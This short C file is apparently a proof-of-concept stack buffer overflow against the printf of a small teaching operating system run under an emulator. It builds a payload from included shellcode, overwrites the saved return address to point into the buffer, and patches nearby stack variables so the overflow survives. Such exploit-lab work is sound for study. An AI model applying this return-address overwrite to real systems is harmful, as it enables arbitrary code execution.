#include "stdio.h"
#include "type.h"

#include "poc_code.h"

int main() {
	int i;	
	char *p = poc_code_bin;
	u8 buf[0x500];
	// inner_buf (ebp - 0x420)
	for(i = 0; i < 0x424; i++) 
		buf[i] = i < poc_code_bin_len ? p[i] : '#';
	// retaddr = buf	
	*(u8 **)(buf + 0x424) = buf;
	// string end
	buf[0x428] = 0;
	// p_next_arg (ebp - 0x10) = empty_string
	*(u8 **)(buf + 0x410) = buf + 0x428;
	// align_nr (ebp - 0x1c) = -1
	*(int *)(buf + 0x404) = -1;
	// p (ebp - 0xc) to strcpy
	*(u8 **)(buf + 0x414) = buf;
	// magic break
	asm ("xchg %bx, %bx");
	printf("%s", buf);
	return 0;
}
